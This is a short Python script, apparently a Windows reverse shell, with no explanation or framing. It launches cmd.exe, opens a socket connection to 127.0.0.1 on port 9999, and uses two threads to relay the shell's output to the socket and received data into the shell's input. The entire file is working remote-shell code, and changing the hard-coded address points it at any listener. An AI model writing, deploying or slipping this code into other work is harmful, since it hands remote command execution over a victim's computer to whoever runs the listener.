import os
import socket
import subprocess
import threading

p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
s = socket.socket()
s.connect(('127.0.0.1', 9999))


def send():
    while 1:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(o)


def recv():
    while 1:
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)


threading.Thread(target=send, daemon=True).start()
threading.Thread(target=recv).start()
